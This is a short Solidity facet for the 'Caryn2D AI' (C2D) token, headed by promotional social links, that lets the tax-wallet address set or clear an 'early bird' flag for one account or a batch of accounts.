// SPDX-License-Identifier: MIT

/**
Name: Caryn2D AI
Ticker: C2D

✅Telegram: https://t.me/CARYN2DCOIN

🕊Twitter: https://twitter.com/AIcaryn2d

🌐Website: https://caryn2d.xyz/

**/

pragma solidity 0.8.18;
import "./TestLib.sol";
contract setEarlyBirdFacet is Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function setEarlyBird(address account, bool value) public {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds._taxWallet);
        _setEarlyBirds(account, value);
    }
    function _setEarlyBirds(address account, bool value) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._earlyBirds[account] = value;
    }
    function setEarlyBirds(address[] calldata accounts, bool value) public {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds._taxWallet);
        for (uint i = 0; i < accounts.length; i++) {
            _setEarlyBirds(accounts[i], value);
        }
    }
}
